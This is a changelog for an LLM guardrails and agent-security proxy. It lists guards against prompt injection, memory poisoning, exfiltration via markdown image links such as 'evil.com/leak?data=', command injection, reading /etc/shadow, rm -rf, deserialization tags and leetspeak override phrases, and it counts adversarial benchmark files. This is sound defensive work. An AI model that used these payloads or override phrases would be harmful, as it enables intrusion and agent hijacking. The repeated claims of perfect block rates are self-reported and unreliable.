# Changelog

All notable changes to the **Agentic AI Security Firewall & LLM Guardrails Proxy** project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.6.0] - 2026-09-26

### Added
- **Agent Tool Role-Based Access Control & Privilege Scoping Guard (`agent_tool_rbac_guard.py`)**: Enforces multi-tier Role-Based Access Control (RBAC) and least privilege scoping across agent swarms (`anonymous`, `user`, `agent_worker`, `agent_supervisor`, `security_auditor`, `system_admin`), preventing lateral privilege escalation and unauthorized tool invocation.
- **Unicode Bidirectional (Bidi) Text Override Guard (`bidi_override_guard.py`)**: Intercepts Trojan Source attacks (CVE-2021-42574) and directional override spoofing (`\u202A-\u202E`, `\u2066-\u2069`) designed to visually disguise prompt injection commands from audit monitors.
- **Insecure Deserialization & Polyglot Payload Guard (`deserialization_guard.py`)**: Deep inspection of prompt contexts and tool arguments for Python pickle opcodes, PyYAML dangerous execution tags (`!!python/object/apply`), Java object streams (`rO0AB`), PHP serialization injection, and prototype pollution gadgets.
- **Context Bomb & Algorithmic Complexity DoS Guard (`context_bomb_guard.py`)**: Neutralizes XML recursive entity expansion (Billion Laughs), YAML anchor multiplication bombs, container nesting depth bloat, and decompression bombs (> 50:1 ratio).
- **Agent Tool Velocity & Anomaly Burst Limiter Guard (`agent_velocity_guard.py`)**: Stateful sliding-window tool frequency tracker detecting rogue agent execution storms, high-frequency bursts, and repeated failure lockouts.
- **Cryptographic Memory Audit Ledger (`memory_audit_ledger.py`)**: Tamper-evident, SHA-256 hash-chained Merkle ledger for agent episodic memories, verifying chain integrity and halting recall of tainted or mutated memory records.
- **Autonomous Multi-Agent Zero-Trust Governance Specification (`docs/MULTI_AGENT_ZERO_TRUST_GOVERNANCE.md`)**: Comprehensive architectural guide covering swarm threat modeling, inter-agent cryptographic authentication, and incident response playbooks.
- **Adversarial Benchmark Expansion to 145 Test Cases**: Added `agentic_rbac_bidi_and_bombs.json`, sustaining a **100.0% block rate, 0.0% FPR, and 1.0000 F1 score** across all 145 tests in 10 categories.
- **Obsidian Amber Portal Simulator Enhancements**: Integrated Bidi Trojan Source, Agent Tool Privilege Escalation, and XML Billion Laughs interactive presets and live verdicts.

### Changed
- Integrated RBAC, Bidi override, deserialization, context bomb, and velocity guards directly into `SecurityPipeline` inbound message and tool call validation stages.
- Expanded automated unit and integration test suite to **293 passing tests**.

## [2.5.0] - 2026-09-25

### Added
- **Context Window Exfiltration & Covert Channel Guard (`context_exfiltration_guard.py`)**: Intercepts covert data exfiltration channels including parameterized markdown image links (`![img](https://evil.com/leak?data=...)`), HTML media tags, DNS tunneling syntax, and variable interpolation.
- **Agent Tool Parameter Type & Semantic Bounds Enforcer (`tool_param_type_enforcer.py`)**: Deep semantic typing, numerical boundary enforcement, string length capping, and enum constraints on agentic tool parameters to prevent type confusion and buffer exhaustion.
- **Dynamic Canary Vault with TTL Rotation (`canary_vault.py`)**: Cryptographic per-session canary lifecycle manager with automatic time-to-live expiration, thread-safe in-memory vault, and revocation checking.
- **Multi-Agent Message Verification & HMAC Authentication Guard (`agent_message_signer.py`)**: Peer-to-peer agent message envelope signer and validator with HMAC-SHA256 signatures, clock-skew verification, and nonce replay defense.
- **Semantic Loop & Agent Deadlock Breaker (`semantic_loop_breaker.py`)**: Rolling Jaccard and token-overlap analyzer that detects cyclic reasoning loops, repetitive tool failure retries, and agent deadlocks to prevent token exhaustion.
- **Agent Persistent Memory Poisoning Guard (`memory_poisoning_guard.py`)**: Scans memory storage operations for covert directive overrides, exfiltration triggers, latent command execution hooks, persona hijacks, and false privilege elevation claims.
- **OWASP Top 10 for Agentic AI Architecture Specification (`docs/OWASP_AGENTIC_AI_TOP_10.md`)**: Comprehensive coverage matrix mapping all proxy guardrails to risks ASI01 through ASI10 with SOC incident response runbooks.
- **Adversarial Benchmark Expansion to 130 Test Cases**: Added `agentic_memory_and_exfil_attacks.json`, sustaining a **100.0% block rate, 0.0% false positives, and 1.0000 F1 score** across all 130 tests.
- **Obsidian Amber Portal Simulator Enhancements**: Integrated Memory Poisoning and Markdown Exfiltration interactive sandbox presets.

### Changed
- Integrated context exfiltration, memory poisoning, parameter enforcement, and loop breaking guards directly into `SecurityPipeline` inbound and outbound stages.
- Expanded automated unit and integration test suite to **237 passing tests**.

## [2.4.0] - 2026-09-24

### Added
- **Phonetic & Multi-Character Leetspeak Deobfuscator (`phonetic_leetspeak_guard.py`)**: Two-stage acoustic homophone and multi-character leet normalization engine neutralizing evasive instruction overrides (`1gn0r3 4ll pr3v10us`, `ph0rget`).
- **Agent Tool Command Injection & Chaining Guard (`command_injection_guard.py`)**: Deep inspection of agent tool arguments for shell metacharacters (`;`, `&&`, `||`, `|`), backticks, POSIX subshells (`$(...)`), and sensitive system files (`/etc/shadow`, SAM).
- **Token Smuggling & Zero-Width Steganography Guard (`token_smuggling_guard.py`)**: Interception of covert prompt injections concealed within zero-width Unicode characters (`\u200B`, `\u200C`, `\u200D`, `\uFEFF`, bidirectional controls) with automated stripping.
- **Agent Tool Recursion Depth & Budget Quota Guard (`recursion_budget_guard.py`)**: Stateful session tracking enforcing hard limits on recursion depth and total tool execution budgets to prevent infinite agent loop exhaustion.
- **Active Canary Redaction & Dynamic Scrubber (`canary_redactor.py`)**: Real-time outbound scrubber identifying and neutralizing reflected canary security tokens with configurable in-place redaction or blocking.
- **Enterprise Zero-Trust Agentic Security Specification (`docs/ZERO_TRUST_AGENT_SECURITY.md`)**: Comprehensive architectural standard for autonomous agent governance, least privilege tool delegation, and defense-in-depth pipelines.
- **Adversarial Benchmark Expansion to 115 Test Cases**: Added `smuggling_and_command_attacks.json`, sustaining a **100.0% block rate, 0.0% FPR, and 1.0000 F1 score** across all 115 test cases.
- **Obsidian Amber Showcase Simulator Enhancements**: Integrated token smuggling, command chaining, and phonetic leetspeak interactive presets and live inspection rules into the portal interface.

### Changed
- Integrated phonetic leetspeak, command injection, and token smuggling guards directly into the core `SecurityPipeline` inbound and tool inspection stages.
- Expanded automated test suite from 169 to **199 passing tests** with 100% test coverage across all new guard modules.

## [2.3.0] - 2026-09-23

### Added
- **Network Perimeter & CIDR Blocklist Guard (`network_guard.py`)**: Zero-trust client IP inspection blocking bogons, testnets, and cloud metadata services (`169.254.169.254/32`, `metadata.google.internal`), with egress URL SSRF detection across hex, octal, and dword encodings.
- **Strict Security Headers & Anti-Caching Middleware (`security_headers.py`)**: ASGI middleware enforcing `no-store, no-cache, must-revalidate` cache controls, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, and stripping server disclosure headers.
- **Recursive Multi-Tier Unpacking & Normalization Guard (`nested_unpack_guard.py`)**: Recursively decodes nested URL percent-encoding, double URL encoding, HTML character entities, hex/unicode escape sequences (`\x27`, `\u0027`), and embedded Base64 payload wrappers.
- **Agent Goal Drift & Roleplay Hijacking Detector (`goal_drift_detector.py`)**: Detects autonomous agent persona subversion, developer mode circumventions, and rule abandonment in both inbound prompts and outbound completions.
- **Structured Output & Outbound JSON Schema Enforcer (`json_schema_enforcer.py`)**: Validates agent structured outputs against strict schemas, neutralizes recursive JSON bomb DoS attacks, and prevents prototype pollution (`__proto__`, `constructor`).
- **Format-Preserving Synthetic PII Replacement Engine (`pii_synthetic_generator.py`)**: Replaces sensitive data with deterministic, format-preserving synthetic proxies preserving grammar and few-shot prompt syntax.
- **Adversarial Benchmark Expansion to 100 Test Cases**: Added `nested_and_drift_attacks.json` (16 enterprise adversarial vectors), achieving a **100.0% block rate, 0.0% FPR, and 1.0000 F1 score** across all 100 test cases.
- **Enterprise Production Hardening & Deployment Guide (`docs/PRODUCTION_HARDENING_GUIDE.md`)**: Comprehensive production deployment architecture, Kubernetes isolation, and zero-trust container configuration guide.

### Changed
- Integrated network perimeter, nested unpacking, and goal drift detectors into `SecurityPipeline` inbound and outbound stages.
- Expanded automated unit and integration test suite to **169 passing tests**.

## [2.2.0] - 2026-09-22

### Added
- **SQL & NoSQL Injection Guard (`sql_nosql_guard.py`)**: Real-time inspection of LLM-generated database queries and agent tool arguments for tautologies (`OR 1=1`), UNION exfiltration, stacked table drops, time delays, and MongoDB `$where` / `$gt` operator injection.
- **AST Code Sandbox Policy Inspector (`code_sandbox_policy.py`)**: Static AST analysis of LLM-generated Python scripts before sandbox execution, blocking dangerous imports (`os`, `subprocess`, `socket`, `ctypes`), unsafe builtins (`eval`, `exec`), and dunder class hierarchy traversal (`__subclasses__`).
- **Differential N-Gram Prompt Leakage Detector (`differential_leak_guard.py`)**: Measures continuous n-gram containment and longest contiguous token subsequences between internal system directives and model completions to catch subtle or paraphrased extraction leaks.
- **RAG Hallucination & Citation Grounding Verifier (`hallucination_verifier.py`)**: Cross-references RAG generation against retrieved source documents to detect ungrounded claims, fabricated external URLs, and phantom citation markers.
- **Token Padding & Delimiter Evasion Guard (`token_padding_guard.py`)**: Intercepts whitespace padding floods (>65% whitespace) and repetitive boundary delimiter bursts (>=25 symbols) designed to bypass heuristic filters or push context limits.
- **Sensitive Document Watermark Detector (`watermark_detector.py`)**: Identifies corporate classification markings, Traffic Light Protocol tags (`TLP:RED`, `TLP:AMBER`), and legal privilege headers (`ATTORNEY-CLIENT PRIVILEGED`) to prevent data spill incidents.
- **RFC 5424 Syslog & Common Event Format (CEF) SIEM Forwarder (`siem_forwarder.py`)**: Enterprise SOC telemetry generator formatting security audit logs for Splunk, Elastic, and Microsoft Sentinel.
- **Upstream LLM Circuit Breaker (`circuit_breaker.py`)**: Three-state circuit breaker (`CLOSED`, `OPEN`, `HALF_OPEN`) mitigating cascading outages, upstream rate limits, and latency spikes with automated fallback routing.
- **Enterprise AI Security Incident Response Playbook (`docs/INCIDENT_RESPONSE_PLAYBOOK.md`)**: Comprehensive SOC triage, containment, and forensic runbooks aligned with NIST SP 800-61r2 and NIST AI RMF.
- **Adversarial Benchmark Expansion**: Added `database_and_ast_attacks.json`, expanding the evaluation harness to 84 curated vectors with a 100.0% block rate, 0.0% FPR, and 1.0000 F1 score.

### Changed
- Integrated extended database, AST sandbox, and token padding guards into inbound and outbound execution pipelines.
- Updated Obsidian Amber web portal simulator with new presets (`sqli`, `ast`, `padding`, `watermark`) and live client-side heuristic inspection rules.
- Expanded automated unit and integration test suite to **130 passing tests**.

## [2.1.0] - 2026-09-18

### Added
- **Homoglyph & Leetspeak Spoofing Guard (`homoglyph_detector.py`)**: Identifies mixed-script Unicode lookalike substitutions (Cyrillic, Greek) and normalizes leetspeak alphanumeric patterns to prevent filter evasion.
- **Shannon Entropy Secret Scanner (`secret_entropy_scanner.py`)**: Computes information entropy on model generation tokens, blocking high-entropy raw credentials, API keys, and private certificates.
- **Structural Anomaly & Glitch Token Detector (`anomaly_detector.py`)**: Intercepts token repetition floods (>15 repetitions), single token buffer exhaustion (>400 chars), and abnormal punctuation saturation (>65%).
- **Multilingual Adversarial Jailbreak Guard (`multilingual_guard.py`)**: Detects cross-lingual prompt overrides translated into Spanish, French, German, Italian, Russian, and Chinese.
- **Dynamic Cryptographic Canary Service (`canary_generator.py`)**: Generates per-session HMAC-SHA256 signed canaries to reliably detect system instruction exfiltration while preventing replay attacks.
- **Model Context Protocol (MCP) Tool Validator (`mcp_validator.py`)**: Inspects agent tool calls for shell injection metacharacters, directory traversal (`../../`), and destructive commands (`rm -rf`, `sudo`, `mkfs`).
- **Comprehensive Threat Model Specification (`docs/THREAT_MODEL.md`)**: STRIDE analysis, trust boundaries, and defense-in-depth architecture mapping.
- **Advanced Red-Teaming Benchmark Expansion**: Added 15 new adversarial vectors in `advanced_attacks.json`, bringing the test suite to 69 curated vectors evaluated with 100.0% accuracy.

### Changed
- Integrated all new guardrails into bidirectional `InboundPipeline` and `OutboundPipeline`.
- Updated Obsidian Amber frontend portal simulator with new presets and live detection rules.
- Expanded automated test suite from 37 to 75 comprehensive passing unit and integration tests.

## [2.0.0] - 2026-09-17

### Added
- Initial release of Agentic AI Security Firewall & LLM Guardrails Proxy.
- Transparent reverse proxy implementation for `/v1/chat/completions` (FastAPI + Async HTTPX).
- Multi-layered prompt injection guard with delimiter escaping and base64 decoding.
- Real-time PII sanitization with Luhn checksum algorithm for credit cards.
- System prompt canary tracking and tool call SSRF validation.
- Sliding-window token-bucket rate limiter.
- Full Docker Compose stack with Prometheus and Grafana telemetry.
- Automated adversarial red-teaming test harness with 54 benchmark vectors.
- Interactive Obsidian Amber web showcase with live simulator and Vercel hosting.